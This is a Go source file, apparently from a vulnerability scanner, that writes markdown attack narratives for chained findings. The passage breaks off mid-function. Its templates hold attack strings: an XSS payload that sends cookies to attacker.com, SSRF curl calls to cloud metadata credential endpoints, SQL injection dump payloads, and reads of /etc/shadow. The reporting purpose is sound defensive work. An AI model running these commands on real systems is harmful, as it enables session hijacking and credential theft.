package report

import (
	"fmt"
	"strings"

	"github.com/stormbane-security/beacon/internal/finding"
)

// GenerateNarrative creates a human-readable attack story from a chain finding.
// Returns a markdown-formatted narrative explaining each step. The narrative
// extracts specific details from the finding's Evidence (URLs, parameters,
// services) so the output is concrete, not generic.
func GenerateNarrative(chainFinding finding.Finding, allFindings []finding.Finding) string {
	id := string(chainFinding.CheckID)

	switch id {
	case "correlation.session_hijack_chain":
		return narrativeSessionHijack(chainFinding, allFindings)
	case "correlation.credential_theft_chain":
		return narrativeCredentialTheft(chainFinding, allFindings)
	case "chain.ssrf_to_cloud_creds":
		return narrativeSSRFToCloudCreds(chainFinding, allFindings)
	case "chain.default_creds_to_admin_access":
		return narrativeDefaultCredsToAdmin(chainFinding, allFindings)
	case "chain.env_to_database_access":
		return narrativeEnvToDatabase(chainFinding, allFindings)
	case "chain.sqli_to_credential_dump":
		return narrativeSQLiToCredentialDump(chainFinding, allFindings)
	case "chain.xss_to_session_theft_poc":
		return narrativeXSSToSessionTheft(chainFinding, allFindings)
	case "correlation.full_compromise_chain":
		return narrativeFullCompromise(chainFinding, allFindings)
	case "correlation.lateral_movement_chain":
		return narrativeLateralMovement(chainFinding, allFindings)
	case "correlation.cache_poisoning_chain":
		return narrativeCachePoison(chainFinding, allFindings)
	case "correlation.dns_rebinding_chain":
		return narrativeDNSRebinding(chainFinding, allFindings)
	case "correlation.auth_bypass_chain":
		return narrativeAuthBypass(chainFinding, allFindings)
	case "correlation.ssrf_cloud_iam_chain":
		return narrativeSSRFCloudIAMEscalation(chainFinding, allFindings)
	case "correlation.default_creds_rce_chain":
		return narrativeDefaultCredsRCE(chainFinding, allFindings)
	case "correlation.info_disclosure_lateral_chain":
		return narrativeInfoDisclosureLateral(chainFinding, allFindings)
	case "correlation.jwt_auth_bypass_chain":
		return narrativeJWTAuthBypass(chainFinding, allFindings)
	case "correlation.open_redirect_oauth_chain":
		return narrativeOpenRedirectOAuth(chainFinding, allFindings)
	case "correlation.subdomain_takeover_session_chain":
		return narrativeSubdomainTakeoverSession(chainFinding, allFindings)
	case "correlation.weak_tls_cred_intercept_chain":
		return narrativeWeakTLSCredIntercept(chainFinding, allFindings)
	case "correlation.container_escape_chain":
		return narrativeContainerEscape(chainFinding, allFindings)
	case "correlation.email_spoof_phish_chain":
		return narrativeEmailSpoofPhish(chainFinding, allFindings)
	case "correlation.version_cve_match_chain":
		return narrativeVersionCVEMatch(chainFinding, allFindings)
	default:
		return narrativeGeneric(chainFinding, allFindings)
	}
}

// helper to pull a string from evidence, with fallback.
func evi(f finding.Finding, key, fallback string) string {
	if v, ok := f.Evidence[key].(string); ok && v != "" {
		return v
	}
	return fallback
}

// findRelated returns all findings for the same asset, excluding the chain finding itself.
func findRelated(chainFinding finding.Finding, allFindings []finding.Finding) []finding.Finding {
	var out []finding.Finding
	for _, f := range allFindings {
		if f.CheckID == chainFinding.CheckID && f.Asset == chainFinding.Asset {
			continue
		}
		if f.Asset == chainFinding.Asset {
			out = append(out, f)
		}
	}
	return out
}

// findByCheckPrefix returns the first finding matching a check ID prefix on the same asset.
func findByCheckPrefix(asset, prefix string, allFindings []finding.Finding) *finding.Finding {
	for i := range allFindings {
		if allFindings[i].Asset == asset && strings.HasPrefix(string(allFindings[i].CheckID), prefix) {
			return &allFindings[i]
		}
	}
	// Broaden: any asset.
	for i := range allFindings {
		if strings.HasPrefix(string(allFindings[i].CheckID), prefix) {
			return &allFindings[i]
		}
	}
	return nil
}

func narrativeSessionHijack(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	corsURL := evi(cf, "url", "https://"+asset)
	xssURL := evi(cf, "xss_url", "")
	xssParam := evi(cf, "parameter", "q")

	if xssURL == "" {
		if xf := findByCheckPrefix(asset, "web.xss", all); xf != nil {
			xssURL = evi(*xf, "url", "https://"+asset+"/search")
			xssParam = evi(*xf, "parameter", xssParam)
		} else {
			xssURL = "https://" + asset + "/search"
		}
	}

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Session Hijack via CORS + XSS\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker can steal any user's session and impersonate them.\n\n")

	fmt.Fprintf(&b, "### Step 1: CORS Misconfiguration\n")
	fmt.Fprintf(&b, "The server at `%s` reflects any Origin header with\n", asset)
	fmt.Fprintf(&b, "`Access-Control-Allow-Credentials: true`. This allows JavaScript from\n")
	fmt.Fprintf(&b, "any domain to make authenticated requests.\n\n")

	fmt.Fprintf(&b, "### Step 2: Reflected XSS\n")
	fmt.Fprintf(&b, "The page at `%s` reflects user input via the `%s` parameter without encoding.\n", xssURL, xssParam)
	fmt.Fprintf(&b, "An attacker can inject `<script>` tags that execute in the victim's browser.\n\n")

	fmt.Fprintf(&b, "### Step 3: Cookie Theft\n")
	fmt.Fprintf(&b, "Session cookies lack the `HttpOnly` flag. JavaScript can read\n")
	fmt.Fprintf(&b, "`document.cookie` and exfiltrate the session token.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Attacker crafts a URL: `%s?%s=<script>...</script>`\n", xssURL, xssParam)
	fmt.Fprintf(&b, "2. Victim clicks the link\n")
	fmt.Fprintf(&b, "3. XSS payload executes in victim's browser\n")
	fmt.Fprintf(&b, "4. Script reads `document.cookie` (no HttpOnly protection)\n")
	fmt.Fprintf(&b, "5. Script sends cookie to attacker's server via CORS (no origin restriction on `%s`)\n", corsURL)
	fmt.Fprintf(&b, "6. Attacker replays the cookie to access victim's account\n")

	return b.String()
}

func narrativeCredentialTheft(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	filePath := evi(cf, "path", "/.env")
	credSource := evi(cf, "credential_source", filePath)
	snippet := evi(cf, "snippet", "DATABASE_URL=postgres://admin:p4ssw0rd@db.internal:5432/prod")
	grantTarget := evi(cf, "grants_access_to", "database")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Credential Theft via Exposed Configuration\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker can harvest production credentials and access backend systems directly.\n\n")

	fmt.Fprintf(&b, "### Step 1: Configuration File Exposed\n")
	fmt.Fprintf(&b, "The file `%s` on `%s` is publicly accessible and contains credentials:\n", credSource, asset)
	fmt.Fprintf(&b, "```\n%s\n```\n\n", snippet)

	fmt.Fprintf(&b, "### Step 2: Backend Access\n")
	fmt.Fprintf(&b, "Using the extracted credentials, the attacker connects directly to\n")
	fmt.Fprintf(&b, "the %s service.\n\n", grantTarget)

	fmt.Fprintf(&b, "### Step 3: Data Exfiltration\n")
	fmt.Fprintf(&b, "With %s access, the attacker can:\n", grantTarget)
	fmt.Fprintf(&b, "- Read all user records\n")
	fmt.Fprintf(&b, "- Extract password hashes\n")
	fmt.Fprintf(&b, "- Access payment/PII data\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Attacker fetches `https://%s%s`\n", asset, credSource)
	fmt.Fprintf(&b, "2. Parses credentials from the response\n")
	fmt.Fprintf(&b, "3. Connects to the %s backend using extracted credentials\n", grantTarget)
	fmt.Fprintf(&b, "4. Dumps sensitive data\n")

	return b.String()
}

func narrativeSSRFToCloudCreds(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	ssrfURL := evi(cf, "url", "https://"+asset+"/api/fetch")
	param := evi(cf, "parameter", "url")
	provider := evi(cf, "cloud_provider", "AWS")
	role := evi(cf, "iam_role", "ec2-instance-role")

	metaEndpoint := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
	if strings.EqualFold(provider, "gcp") {
		metaEndpoint = "http://metadata.google.internal/computeMetadata/v1/"
	} else if strings.EqualFold(provider, "azure") {
		metaEndpoint = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
	}

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: SSRF to %s Cloud Credential Theft\n\n", provider)
	fmt.Fprintf(&b, "**Impact:** An attacker can steal %s IAM credentials and access cloud resources (S3, RDS, etc.).\n\n", provider)

	fmt.Fprintf(&b, "### Step 1: Server-Side Request Forgery\n")
	fmt.Fprintf(&b, "The endpoint `%s` accepts a user-controlled `%s` parameter and fetches\n", ssrfURL, param)
	fmt.Fprintf(&b, "arbitrary URLs from the server side without validation.\n\n")

	fmt.Fprintf(&b, "### Step 2: Cloud Metadata Access\n")
	fmt.Fprintf(&b, "The attacker uses the SSRF to reach the %s metadata endpoint at\n", provider)
	fmt.Fprintf(&b, "`%s` and discovers IAM role `%s`.\n\n", metaEndpoint, role)

	fmt.Fprintf(&b, "### Step 3: Credential Extraction\n")
	fmt.Fprintf(&b, "The attacker fetches temporary credentials (AccessKeyId, SecretAccessKey,\n")
	fmt.Fprintf(&b, "SessionToken) for the `%s` role.\n\n", role)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. `curl '%s?%s=%s'` -- discover IAM role\n", ssrfURL, param, metaEndpoint)
	fmt.Fprintf(&b, "2. `curl '%s?%s=%s%s'` -- extract credentials\n", ssrfURL, param, metaEndpoint, role)
	fmt.Fprintf(&b, "3. `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`\n")
	fmt.Fprintf(&b, "4. `aws s3 ls` -- access cloud resources as the instance role\n")

	return b.String()
}

func narrativeDefaultCredsToAdmin(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	service := evi(cf, "service", "admin panel")
	username := evi(cf, "username", "admin")
	password := evi(cf, "password", "admin")
	url := evi(cf, "url", "https://"+asset+"/admin")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Default Credentials to Admin Access\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker gains full administrative access to `%s` using default credentials.\n\n", service)

	fmt.Fprintf(&b, "### Step 1: Default Credentials\n")
	fmt.Fprintf(&b, "The %s at `%s` accepts the default credentials `%s:%s`.\n\n", service, url, username, password)

	fmt.Fprintf(&b, "### Step 2: Admin Panel Access\n")
	fmt.Fprintf(&b, "With valid admin credentials, the attacker can access the full\n")
	fmt.Fprintf(&b, "administrative interface at `%s`.\n\n", url)

	fmt.Fprintf(&b, "### Step 3: System Compromise\n")
	fmt.Fprintf(&b, "From the admin panel the attacker can:\n")
	fmt.Fprintf(&b, "- Create new admin accounts for persistence\n")
	fmt.Fprintf(&b, "- Modify application configuration\n")
	fmt.Fprintf(&b, "- Access or export user data\n")
	fmt.Fprintf(&b, "- Potentially achieve code execution via admin features\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Navigate to `%s`\n", url)
	fmt.Fprintf(&b, "2. Log in with `%s` / `%s`\n", username, password)
	fmt.Fprintf(&b, "3. Explore admin functionality for data access and code execution\n")

	return b.String()
}

func narrativeEnvToDatabase(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	envPath := evi(cf, "path", "/.env")
	snippet := evi(cf, "snippet", "DATABASE_URL=postgres://user:pass@db:5432/app")
	dbHost := evi(cf, "pivot_target", "db.internal")
	dbPort := evi(cf, "pivot_port", "5432")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Exposed .env to Database Access\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker extracts database credentials from a publicly accessible .env file and connects to the production database.\n\n")

	fmt.Fprintf(&b, "### Step 1: .env File Exposed\n")
	fmt.Fprintf(&b, "The file `%s` on `%s` is publicly accessible and contains:\n", envPath, asset)
	fmt.Fprintf(&b, "```\n%s\n```\n\n", snippet)

	fmt.Fprintf(&b, "### Step 2: Database Connection\n")
	fmt.Fprintf(&b, "Using the extracted credentials, the attacker connects to\n")
	fmt.Fprintf(&b, "the database at `%s:%s`.\n\n", dbHost, dbPort)

	fmt.Fprintf(&b, "### Step 3: Data Exfiltration\n")
	fmt.Fprintf(&b, "With database access, the attacker can:\n")
	fmt.Fprintf(&b, "- Enumerate all tables and schemas\n")
	fmt.Fprintf(&b, "- Dump user credentials and PII\n")
	fmt.Fprintf(&b, "- Modify or delete records\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. `curl https://%s%s` -- fetch exposed environment file\n", asset, envPath)
	fmt.Fprintf(&b, "2. Parse DATABASE_URL from the response\n")
	fmt.Fprintf(&b, "3. `psql -h %s -p %s -U <user> <dbname>` -- connect with stolen creds\n", dbHost, dbPort)
	fmt.Fprintf(&b, "4. `SELECT * FROM users;` -- exfiltrate data\n")

	return b.String()
}

func narrativeSQLiToCredentialDump(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	param := evi(cf, "parameter", "id")
	payload := evi(cf, "payload", "' UNION SELECT username,password FROM users--")
	recordCount := evi(cf, "record_count", "unknown number of")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: SQL Injection to Credential Dump\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker exploits SQL injection to extract %s credential records from the database.\n\n", recordCount)

	fmt.Fprintf(&b, "### Step 1: SQL Injection\n")
	fmt.Fprintf(&b, "The endpoint `%s` is vulnerable to SQL injection via the `%s` parameter.\n", url, param)
	fmt.Fprintf(&b, "Payload: `%s`\n\n", payload)

	fmt.Fprintf(&b, "### Step 2: Schema Enumeration\n")
	fmt.Fprintf(&b, "The attacker enumerates database tables and identifies credential storage\n")
	fmt.Fprintf(&b, "(e.g., `users`, `accounts`, `credentials` tables).\n\n")

	fmt.Fprintf(&b, "### Step 3: Credential Extraction\n")
	fmt.Fprintf(&b, "Using UNION-based or blind SQLi techniques, the attacker dumps\n")
	fmt.Fprintf(&b, "usernames, password hashes, and email addresses.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Confirm injection: `%s?%s=%s`\n", url, param, payload)
	fmt.Fprintf(&b, "2. Enumerate tables: `' UNION SELECT table_name,NULL FROM information_schema.tables--`\n")
	fmt.Fprintf(&b, "3. Dump credentials: `' UNION SELECT username,password FROM users--`\n")
	fmt.Fprintf(&b, "4. Crack password hashes offline with hashcat/john\n")

	return b.String()
}

func narrativeXSSToSessionTheft(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	param := evi(cf, "parameter", "q")
	payload := evi(cf, "payload", "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: XSS to Session Theft\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker steals user sessions via XSS because cookies lack HttpOnly protection.\n\n")

	fmt.Fprintf(&b, "### Step 1: Cross-Site Scripting\n")
	fmt.Fprintf(&b, "The endpoint `%s` reflects the `%s` parameter without sanitization,\n", url, param)
	fmt.Fprintf(&b, "allowing arbitrary JavaScript execution in the victim's browser.\n\n")

	fmt.Fprintf(&b, "### Step 2: Missing HttpOnly Flag\n")
	fmt.Fprintf(&b, "Session cookies on `%s` lack the `HttpOnly` flag, making them\n", asset)
	fmt.Fprintf(&b, "readable by JavaScript via `document.cookie`.\n\n")

	fmt.Fprintf(&b, "### Step 3: Session Exfiltration\n")
	fmt.Fprintf(&b, "The XSS payload reads the session cookie and sends it to an\n")
	fmt.Fprintf(&b, "attacker-controlled server.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Craft malicious URL: `%s?%s=%s`\n", url, param, payload)
	fmt.Fprintf(&b, "2. Send link to victim (phishing, social engineering)\n")
	fmt.Fprintf(&b, "3. Victim clicks link; XSS fires in their browser\n")
	fmt.Fprintf(&b, "4. JavaScript reads `document.cookie` and exfiltrates it\n")
	fmt.Fprintf(&b, "5. Attacker replays the session cookie to impersonate the victim\n")

	return b.String()
}

func narrativeFullCompromise(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	entryPoint := evi(cf, "url", "https://"+asset)
	entryType := evi(cf, "injection_vector", "SQL injection")
	dbHost := evi(cf, "pivot_target", "db.internal")
	dataType := evi(cf, "data_type", "user credentials and PII")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Full Compromise Chain\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker achieves full data exfiltration from `%s` through chained vulnerabilities.\n\n", asset)

	fmt.Fprintf(&b, "### Step 1: Initial Entry (%s)\n", entryType)
	fmt.Fprintf(&b, "The attacker exploits %s at `%s` to gain a foothold.\n\n", entryType, entryPoint)

	fmt.Fprintf(&b, "### Step 2: Pivot to Backend\n")
	fmt.Fprintf(&b, "From the initial entry, the attacker pivots to the backend at `%s`,\n", dbHost)
	fmt.Fprintf(&b, "either through direct database access or SSRF to internal services.\n\n")

	fmt.Fprintf(&b, "### Step 3: Data Exfiltration\n")
	fmt.Fprintf(&b, "The attacker extracts %s from the compromised backend.\n\n", dataType)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Exploit %s at `%s`\n", entryType, entryPoint)
	fmt.Fprintf(&b, "2. Pivot to `%s` via extracted credentials or SSRF\n", dbHost)
	fmt.Fprintf(&b, "3. Exfiltrate %s\n", dataType)
	fmt.Fprintf(&b, "4. Establish persistence if admin access was gained\n")

	return b.String()
}

func narrativeLateralMovement(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	service := evi(cf, "service", "unauthenticated service")
	pivotTarget := evi(cf, "pivot_target", "internal host")
	pivotPort := evi(cf, "pivot_port", "")
	url := evi(cf, "url", "https://"+asset)

	targetStr := pivotTarget
	if pivotPort != "" {
		targetStr = pivotTarget + ":" + pivotPort
	}

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Lateral Movement via %s\n\n", service)
	fmt.Fprintf(&b, "**Impact:** An attacker pivots from `%s` to internal systems at `%s`.\n\n", asset, targetStr)

	fmt.Fprintf(&b, "### Step 1: Unauthenticated Service Access\n")
	fmt.Fprintf(&b, "The %s at `%s` is accessible without authentication.\n\n", service, url)

	fmt.Fprintf(&b, "### Step 2: Internal Network Discovery\n")
	fmt.Fprintf(&b, "Through the exposed service, the attacker discovers internal hosts\n")
	fmt.Fprintf(&b, "and services not directly accessible from the internet.\n\n")

	fmt.Fprintf(&b, "### Step 3: Lateral Pivot\n")
	fmt.Fprintf(&b, "The attacker uses the exposed service to reach `%s`,\n", targetStr)
	fmt.Fprintf(&b, "bypassing network segmentation.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Access the unauthenticated %s at `%s`\n", service, url)
	fmt.Fprintf(&b, "2. Enumerate internal network via error messages, SSRF, or service features\n")
	fmt.Fprintf(&b, "3. Pivot to `%s`\n", targetStr)
	fmt.Fprintf(&b, "4. Access data or services on the internal host\n")

	return b.String()
}

func narrativeCachePoison(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	header := evi(cf, "unkeyed_header", "X-Forwarded-Host")
	payload := evi(cf, "payload", "evil.attacker.com")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Cache Poisoning via Unkeyed Header\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker poisons the cache at `%s` to serve malicious content to all users.\n\n", asset)

	fmt.Fprintf(&b, "### Step 1: Unkeyed Header Reflection\n")
	fmt.Fprintf(&b, "The server at `%s` reflects the `%s` header in its response\n", url, header)
	fmt.Fprintf(&b, "but the CDN/cache does not include this header in the cache key.\n\n")

	fmt.Fprintf(&b, "### Step 2: Cache Poisoning\n")
	fmt.Fprintf(&b, "The attacker sends a request with `%s: %s`, and the\n", header, payload)
	fmt.Fprintf(&b, "poisoned response is cached by the CDN.\n\n")

	fmt.Fprintf(&b, "### Step 3: Mass Exploitation\n")
	fmt.Fprintf(&b, "All subsequent users requesting `%s` receive the cached\n", url)
	fmt.Fprintf(&b, "poisoned response, which can redirect them to a malicious site\n")
	fmt.Fprintf(&b, "or execute stored XSS.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. `curl -H '%s: %s' '%s'` -- poison the cache\n", header, payload, url)
	fmt.Fprintf(&b, "2. Wait for CDN to cache the response\n")
	fmt.Fprintf(&b, "3. All users visiting `%s` receive the poisoned page\n", url)
	fmt.Fprintf(&b, "4. Poisoned page redirects to attacker site or executes XSS\n")

	return b.String()
}

func narrativeDNSRebinding(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	internalTarget := evi(cf, "pivot_target", "127.0.0.1")
	internalPort := evi(cf, "pivot_port", "80")
	service := evi(cf, "service", "internal service")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: DNS Rebinding Attack\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker bypasses same-origin policy via DNS rebinding to access `%s:%s` from the victim's browser.\n\n", internalTarget, internalPort)

	fmt.Fprintf(&b, "### Step 1: DNS Rebinding Setup\n")
	fmt.Fprintf(&b, "The domain `%s` resolves to a private IP address, indicating\n", asset)
	fmt.Fprintf(&b, "it may be vulnerable to DNS rebinding attacks.\n\n")

	fmt.Fprintf(&b, "### Step 2: Rebinding Execution\n")
	fmt.Fprintf(&b, "The attacker sets up a DNS server that alternates between their\n")
	fmt.Fprintf(&b, "own IP and the internal address `%s`. After the victim loads\n", internalTarget)
	fmt.Fprintf(&b, "the attacker's page, DNS rebinds to the internal IP.\n\n")

	fmt.Fprintf(&b, "### Step 3: Internal Service Access\n")
	fmt.Fprintf(&b, "JavaScript on the attacker's page now makes requests that reach\n")
	fmt.Fprintf(&b, "the %s at `%s:%s`, bypassing firewall rules.\n\n", service, internalTarget, internalPort)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Attacker configures rebinding DNS for their domain\n")
	fmt.Fprintf(&b, "2. Victim visits attacker's page\n")
	fmt.Fprintf(&b, "3. DNS rebinds from attacker IP to `%s`\n", internalTarget)
	fmt.Fprintf(&b, "4. JavaScript accesses `%s:%s` as same-origin\n", internalTarget, internalPort)
	fmt.Fprintf(&b, "5. Attacker exfiltrates responses from the internal %s\n", service)

	return b.String()
}

func narrativeAuthBypass(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	service := evi(cf, "service", "admin panel")
	method := evi(cf, "injection_vector", "JWT algorithm confusion")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Authentication Bypass\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker bypasses authentication on `%s` to gain unauthorized access to `%s`.\n\n", asset, service)

	fmt.Fprintf(&b, "### Step 1: Authentication Weakness\n")
	fmt.Fprintf(&b, "The authentication mechanism at `%s` is vulnerable to %s.\n\n", url, method)

	fmt.Fprintf(&b, "### Step 2: Token Forgery / Bypass\n")
	fmt.Fprintf(&b, "The attacker crafts a forged authentication token or exploits the\n")
	fmt.Fprintf(&b, "weakness to bypass login entirely.\n\n")

	fmt.Fprintf(&b, "### Step 3: Persistent Unauthorized Access\n")
	fmt.Fprintf(&b, "With bypassed authentication, the attacker has persistent access to\n")
	fmt.Fprintf(&b, "the %s without valid credentials.\n\n", service)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Identify %s weakness at `%s`\n", method, url)
	fmt.Fprintf(&b, "2. Forge authentication token or craft bypass request\n")
	fmt.Fprintf(&b, "3. Access `%s` as an authenticated user\n", service)
	fmt.Fprintf(&b, "4. Create a backdoor account for persistence\n")

	return b.String()
}

func narrativeSSRFCloudIAMEscalation(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	ssrfURL := evi(cf, "url", "https://"+asset+"/api/fetch")
	param := evi(cf, "parameter", "url")
	provider := evi(cf, "cloud_provider", "AWS")

	metaEndpoint := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
	credCmd := "aws sts get-caller-identity && aws s3 ls && aws iam list-roles"
	if strings.EqualFold(provider, "gcp") {
		metaEndpoint = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
		credCmd = "gcloud auth list && gcloud projects list && gcloud iam roles list"
	} else if strings.EqualFold(provider, "azure") {
		metaEndpoint = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
		credCmd = "az account show && az role assignment list && az storage account list"
	}

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: SSRF → Cloud Metadata → IAM Escalation to Cloud Admin\n\n")
	fmt.Fprintf(&b, "**Impact:** Full %s cloud account compromise — attacker gains IAM credentials and escalates to cloud admin.\n\n", provider)

	fmt.Fprintf(&b, "### Step 1: Server-Side Request Forgery\n")
	fmt.Fprintf(&b, "The endpoint `%s` accepts a user-controlled `%s` parameter and fetches\n", ssrfURL, param)
	fmt.Fprintf(&b, "arbitrary URLs from the server side without adequate validation.\n\n")
	fmt.Fprintf(&b, "**Proof:** `curl '%s?%s=http://example.com'`\n\n", ssrfURL, param)

	fmt.Fprintf(&b, "### Step 2: Cloud Metadata Service Access\n")
	fmt.Fprintf(&b, "The SSRF reaches the %s instance metadata endpoint at\n", provider)
	fmt.Fprintf(&b, "`%s`, which returns IAM role credentials.\n\n", metaEndpoint)
	fmt.Fprintf(&b, "**Proof:** `curl '%s?%s=%s'`\n\n", ssrfURL, param, metaEndpoint)

	fmt.Fprintf(&b, "### Step 3: IAM Credential Extraction\n")
	fmt.Fprintf(&b, "The metadata response contains temporary credentials (AccessKeyId,\n")
	fmt.Fprintf(&b, "SecretAccessKey, SessionToken) for the instance's IAM role.\n\n")

	fmt.Fprintf(&b, "### Step 4: Cloud Privilege Escalation\n")
	fmt.Fprintf(&b, "The attacker uses the stolen IAM credentials to enumerate cloud resources\n")
	fmt.Fprintf(&b, "and escalate privileges — listing S3 buckets, databases, secrets, and\n")
	fmt.Fprintf(&b, "potentially assuming more privileged roles.\n\n")

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Block SSRF by allowlisting permitted URL schemes and hosts\n")
	fmt.Fprintf(&b, "- **Defense in depth:** Enable IMDSv2 (require token-based metadata requests)\n")
	fmt.Fprintf(&b, "- **IAM hardening:** Apply least-privilege to instance roles; deny `iam:PassRole` and `sts:AssumeRole`\n")
	fmt.Fprintf(&b, "- **Network:** Use VPC endpoints and security groups to restrict metadata access\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. `curl '%s?%s=%s'` — discover IAM role\n", ssrfURL, param, metaEndpoint)
	fmt.Fprintf(&b, "2. Parse AccessKeyId, SecretAccessKey, SessionToken from response\n")
	fmt.Fprintf(&b, "3. `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`\n")
	fmt.Fprintf(&b, "4. `%s`\n", credCmd)
	fmt.Fprintf(&b, "5. Escalate to admin via overly permissive role policies\n")

	return b.String()
}

func narrativeDefaultCredsRCE(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	service := evi(cf, "service", "admin panel")
	username := evi(cf, "username", "admin")
	password := evi(cf, "password", "admin")
	adminURL := evi(cf, "url", "https://"+asset+"/admin")
	rceCheck := evi(cf, "rce_check", "CVE-XXXX-XXXXX")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Default Credentials → Admin Panel → Remote Code Execution\n\n")
	fmt.Fprintf(&b, "**Impact:** Full server compromise — attacker gains shell access via default credentials and known RCE.\n\n")

	fmt.Fprintf(&b, "### Step 1: Default Credentials\n")
	fmt.Fprintf(&b, "The %s at `%s` accepts the default credentials `%s:%s`.\n", service, adminURL, username, password)
	fmt.Fprintf(&b, "These credentials ship with the software and are documented publicly.\n\n")
	fmt.Fprintf(&b, "**Proof:** `curl -u %s:%s '%s'`\n\n", username, password, adminURL)

	fmt.Fprintf(&b, "### Step 2: Admin Panel Access\n")
	fmt.Fprintf(&b, "Authenticated as admin, the attacker gains access to the full management\n")
	fmt.Fprintf(&b, "interface including configuration, user management, and plugin/extension\n")
	fmt.Fprintf(&b, "installation capabilities.\n\n")

	fmt.Fprintf(&b, "### Step 3: Remote Code Execution\n")
	fmt.Fprintf(&b, "A known RCE vulnerability (%s) exists on this host. With admin access,\n", rceCheck)
	fmt.Fprintf(&b, "the attacker can exploit it for arbitrary command execution — installing\n")
	fmt.Fprintf(&b, "backdoors, exfiltrating data, or pivoting to other systems.\n\n")

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Change all default credentials; enforce strong password policy\n")
	fmt.Fprintf(&b, "- **Patch:** Apply vendor patches for the identified RCE vulnerability\n")
	fmt.Fprintf(&b, "- **Network:** Restrict admin panel access to VPN/internal networks only\n")
	fmt.Fprintf(&b, "- **Monitoring:** Alert on admin logins from unexpected IPs\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Navigate to `%s` and log in with `%s` / `%s`\n", adminURL, username, password)
	fmt.Fprintf(&b, "2. Enumerate admin functionality for code execution vectors\n")
	fmt.Fprintf(&b, "3. Exploit %s for shell access\n", rceCheck)
	fmt.Fprintf(&b, "4. `id && whoami && cat /etc/shadow` — confirm host-level access\n")

	return b.String()
}

func narrativeInfoDisclosureLateral(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	filePath := evi(cf, "path", "/.env")
	snippet := evi(cf, "snippet", "DATABASE_URL=postgres://admin:p4ssw0rd@db.internal:5432/prod")
	targetHost := evi(cf, "pivot_target", "db.internal")
	targetPort := evi(cf, "pivot_port", "5432")
	targetCheck := evi(cf, "target_check", "exposed database")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Information Disclosure → Credential Harvest → Lateral Movement\n\n")
